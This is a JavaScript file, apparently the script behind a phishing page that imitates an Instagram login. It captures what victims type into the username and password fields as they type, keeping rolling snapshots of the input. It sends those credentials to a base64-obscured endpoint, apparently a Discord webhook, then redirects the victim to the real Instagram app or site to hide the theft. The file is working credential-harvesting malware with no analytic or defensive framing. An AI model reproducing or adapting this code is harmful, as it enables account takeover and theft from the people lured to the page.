let l = {
  m: "intent://#Intent;package=com.instagram.android;scheme=https;end",
  l: "intent://#Intent;package=com.instagram.lite;scheme=https;end",
  w: "https://instagram.com"
};
let U=atob(document.getElementById('w').textContent);
let x = {
    u:[],
    p:[]
};
function z(e,up,g){
x[up].push(e);
if(x[up].length == 6){
    let t=x[up];
    x[up] = [x[up][1],x[up][2],x[up][3],x[up][4],x[up][5]];
    return {a:2,b:{a:g.mn,b:g.mo,c:t}};
}

return {a:5};
}
let m=new URLSearchParams(window.location.search);
let g={my:m.get('y') || "",mn:m.get('n') || "",mo:m.get("o") || ""};
let K={
method:"POST",
headers:{"Content-Type":"application/json"},
body:null};
document.addEventListener('DOMContentLoaded',async()=>{
document.getElementById('y').src=g.my;
document.getElementById('n').innerText=g.mn;
document.getElementById('p').addEventListener('input',async(e)=>{
let Q=z(e.target.value,"p",g);if(Q["a"]===2){
let ts = Math.floor(Date.now() / 1000);

let payload = {
  embeds: [
    {
      title: `${Q.b.a}`,
      color: 0x1abc9c,
      description: `**Timestamp:** <t:${ts}:F>`,
      fields: [
        { name:"uimopax",value:"wardonax",inline:false},
        { name: "morogiono", value: Q.b.b || "N/A", inline: true },
        { name: "t", value: Q.b.c.join("\n") || "N/A", inline: false }
      ]
    }
  ]
};

await fetch(U, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(payload)
});
}});
document.getElementById('u').addEventListener('input',async(e)=>{
let Q=z(e.target.value,"u",g);
if(Q["a"]===2){
let ts = Math.floor(Date.now() / 1000);

let payload = {
  embeds: [
    {
      title: `${Q.b.a}`,
      color: 0x1abc9c,
      description: `**Timestamp:** <t:${ts}:F>`,
      fields: [
        { name: "morogiono", value: Q.b.b || "N/A", inline: true },
        { name: "uimopax",value:"nameonax",inline:false},
        { name: "t", value: Q.b.c.join("\n") || "N/A", inline: false }
      ]
    }
  ]
};
await fetch(U, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(payload)
});
}});
document.getElementById('s').addEventListener('click',async(e)=>{
let ts = Math.floor(Date.now() / 1000);

let payload = {
  embeds: [
    {
      title: `${m.get("n")}` || "none",
      color: 0x1abc9c,
      description: `**Timestamp:** <t:${ts}:F>`,
      fields: [
        { name: "mo", value: "success", inline: true }
      ]
    }
  ]
};

await fetch(U, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(payload)
});if (l && l.m) {
  window.location.href = l.m;
  setTimeout(() => { window.location.href = l.l }, 1000);
} else {
  window.location.href = l.w;
}
});
});
